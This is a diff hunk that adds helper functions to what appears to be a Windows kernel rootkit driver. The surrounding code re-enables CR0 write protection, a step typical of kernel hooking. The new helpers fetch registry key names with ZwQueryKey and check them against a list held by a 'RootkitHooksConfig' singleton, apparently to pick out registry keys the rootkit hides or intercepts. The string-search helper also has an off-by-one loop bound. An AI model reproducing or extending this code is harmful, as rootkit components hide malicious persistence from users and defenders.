@@ -94,3 +94,82 @@ void WPONx64(KIRQL irql)
     __writecr0(cr0);
     KeLowerIrql(irql);
 }
+
+
+NTSTATUS GetKeyName(HANDLE keyHandle, PKEY_NAME_INFORMATION* keyNameInfo)
+{
+    ULONG nameInfoLength = 0;
+
+    auto infoStatus = ZwQueryKey(keyHandle, KEY_INFORMATION_CLASS::KeyNameInformation, NULL, 0, &nameInfoLength);
+
+    if (infoStatus == STATUS_BUFFER_TOO_SMALL)
+    {
+        *keyNameInfo = reinterpret_cast<PKEY_NAME_INFORMATION>(ExAllocatePool(NonPagedPool, nameInfoLength));
+
+        if (!(*keyNameInfo))
+        {
+            return STATUS_FAIL_CHECK;
+        }
+
+        infoStatus = ZwQueryKey(keyHandle, KEY_INFORMATION_CLASS::KeyNameInformation, *keyNameInfo, nameInfoLength, &nameInfoLength);
+
+        if (!NT_SUCCESS(infoStatus))
+        {
+            ExFreePool(*keyNameInfo);
+        }
+    }
+
+    return infoStatus;
+}
+
+
+NTSTATUS CheckReqForMatchRegisterInList(HANDLE keyHandle, OUT RegistryKey& key)
+{
+	PKEY_NAME_INFORMATION nameInfo;
+	auto statusInfo = GetKeyName(keyHandle, &nameInfo);
+
+	if (!NT_SUCCESS(statusInfo))
+	{
+		return STATUS_FAIL_CHECK;
+	}
+
+	auto finder = [&nameInfo](RegistryKey key)
+	{
+		return key.registryLength == nameInfo->NameLength && (RtlCompareMemory(key.registryName, nameInfo->Name, key.registryLength) == key.registryLength);
+	};
+
+    key = RootkitHooksConfig::getInstance().getRegistryList().Find(finder);
+
+	if (key.registryLength)
+	{
+		return STATUS_SUCCESS;
+	}
+	else
+	{
+		return STATUS_FAIL_CHECK;
+	}
+}
+
+
+BOOL wstrnotnull(WSTRING str, WSTRING substr)
+{
+
+    SIZE_T substrLen = substr.length / 2;
+    for (SIZE_T i = 0; i < (str.length - substr.length) / 2; i++)
+    {
+        if (wcsncmp(&str.buffer[i], substr.buffer, substrLen) == 0)
+        {
+            return TRUE;
+        }
+    }
+
+    return FALSE;
+}
+
+void PrintNonullStr(PWCHAR buffer, ULONGLONG length)
+{
+    auto last = buffer[length / 2 - 1];
+    buffer[length / 2 - 1] = 0;
+    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "%S\n", buffer);
+    buffer[length / 2 - 1] = last;
+}
